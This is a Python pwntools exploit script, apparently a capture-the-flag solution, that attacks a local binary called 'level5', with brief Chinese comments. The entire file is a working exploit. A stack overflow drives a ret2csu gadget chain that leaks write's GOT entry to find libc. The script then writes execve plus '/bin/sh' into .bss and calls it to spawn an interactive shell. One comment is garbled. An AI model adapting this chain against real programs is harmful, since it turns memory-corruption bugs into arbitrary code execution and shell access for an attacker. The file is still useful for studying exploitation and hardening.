# #coding:utf-8
from pwn import *
sh = process("./level5")
elf = ELF("./level5")
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
gadget1 = 0x00000000004011DE
gadget2 = 0x00000000004011C8
write_got = elf.got['write']
main_addr = elf.symbols['main']


def csu(r12,r13,r14,r15,ret_addr):
    payload = b"a"*136
    payload += p64(gadget1)
    payload += b'b'*8
    payload += p64(0)
    payload += p64(1)
    payload += p64(r12)
    payload += p64(r13)#参数1
    payload += p64(r14)#参数2
    payload += p64(r15)#参数3
    payload += p64(gadget2)
    payload += b'c' * 0x38
    payload += p64(ret_addr)
    sh.sendline(payload)
###第一次溢出，泄露write函数的地址
sh.recvuntil("Hello, World\n")
csu(write_got,1,write_got,8,main_addr)
#利用write函数（因为gadget2中的代码为call，所以必须为write函数的got地址）
#来读取write的got表内容，向后读取8个字节，然后返回至main住花鸟属
write_addr = u64(sh.recv(8))
#接收数据，并解包

offset_addr = write_addr-libc.symbols['write']

execve_addr = offset_addr + libc.symbols['execve']

####第二次溢出，利用read函数写入execve()+/bin/sh
read_addr = elf.got['read']
bss_addr = elf.bss()
csu(read_addr,0,bss_addr,16,main_addr)
#读取用户输入的数据到指定的bss地址,写入16个字节
sh.recvuntil("Hello, World\n")
#gdb.attach(sh)
sh.send(p64(execve_addr)+b'/bin/sh\x00')
#发送execve的地址加上/bin/sh到bss段

###第三次溢出，调用bss地址内的代码
sh.recvuntil("Hello, World\n")
csu(bss_addr,bss_addr+8,0,0,main_addr)
#也就是利用gadget2中的call 来获取权限
sh.interactive()
